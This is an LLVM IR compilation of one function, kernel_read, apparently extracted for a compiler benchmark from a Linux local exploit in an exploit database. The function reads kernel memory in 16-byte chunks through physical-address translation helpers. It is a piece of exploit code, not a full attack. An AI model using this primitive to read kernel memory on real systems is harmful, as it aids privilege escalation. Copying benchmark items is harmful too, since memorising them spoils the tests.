; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_kernel_read.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_kernel_read.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @kernel_read(i32* %0, i8* %1, i64 %2, i64 %3) #0 {
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  store i32* %0, i32** %5, align 8
  store i8* %1, i8** %6, align 8
  store i64 %2, i64* %7, align 8
  store i64 %3, i64* %8, align 8
  %12 = load i64, i64* %7, align 8
  %13 = call i32 @virt2phys(i64 %12)
  store i32 %13, i32* %10, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = load i64, i64* %7, align 8
  %16 = and i64 %15, 15
  %17 = getelementptr i8, i8* %14, i64 %16
  store i8* %17, i8** %11, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sub nsw i32 0, %18
  %20 = and i32 %19, 15
  store i32 %20, i32* %9, align 4
  %21 = load i32, i32* %9, align 4
  %22 = icmp ne i32 %21, 0
  br i1 %22, label %23, label %45

23:                                               ; preds = %4
  %24 = load i32*, i32** %5, align 8
  %25 = load i32, i32* %10, align 4
  %26 = and i32 %25, -16
  %27 = load i8*, i8** %6, align 8
  %28 = call i32 @physread16(i32* %24, i32 %26, i8* %27)
  %29 = load i8*, i8** %6, align 8
  %30 = getelementptr i8, i8* %29, i64 16
  store i8* %30, i8** %6, align 8
  %31 = load i32, i32* %9, align 4
  %32 = load i32, i32* %10, align 4
  %33 = add nsw i32 %32, %31
  store i32 %33, i32* %10, align 4
  %34 = load i64, i64* %8, align 8
  %35 = load i32, i32* %9, align 4
  %36 = sext i32 %35 to i64
  %37 = icmp ugt i64 %34, %36
  br i1 %37, label %38, label %43

38:                                               ; preds = %23
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = load i64, i64* %8, align 8
  %42 = sub i64 %41, %40
  store i64 %42, i64* %8, align 8
  br label %44

43:                                               ; preds = %23
  store i64 0, i64* %8, align 8
  br label %44

44:                                               ; preds = %43, %38
  br label %45

45:                                               ; preds = %44, %4
  br label %46

46:                                               ; preds = %64, %45
  %47 = load i64, i64* %8, align 8
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %68

49:                                               ; preds = %46
  %50 = load i32*, i32** %5, align 8
  %51 = load i32, i32* %10, align 4
  %52 = load i8*, i8** %6, align 8
  %53 = call i32 @physread16(i32* %50, i32 %51, i8* %52)
  br label %54

54:                                               ; preds = %49
  %55 = load i32, i32* %10, align 4
  %56 = add nsw i32 %55, 16
  store i32 %56, i32* %10, align 4
  %57 = load i8*, i8** %6, align 8
  %58 = getelementptr i8, i8* %57, i64 16
  store i8* %58, i8** %6, align 8
  %59 = load i64, i64* %8, align 8
  %60 = icmp uge i64 %59, 16
  br i1 %60, label %61, label %62

61:                                               ; preds = %54
  br label %64

62:                                               ; preds = %54
  %63 = load i64, i64* %8, align 8
  br label %64

64:                                               ; preds = %62, %61
  %65 = phi i64 [ 16, %61 ], [ %63, %62 ]
  %66 = load i64, i64* %8, align 8
  %67 = sub i64 %66, %65
  store i64 %67, i64* %8, align 8
  br label %46

68:                                               ; preds = %46
  %69 = load i8*, i8** %11, align 8
  ret i8* %69
}

declare dso_local i32 @virt2phys(i64) #1

declare dso_local i32 @physread16(i32*, i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
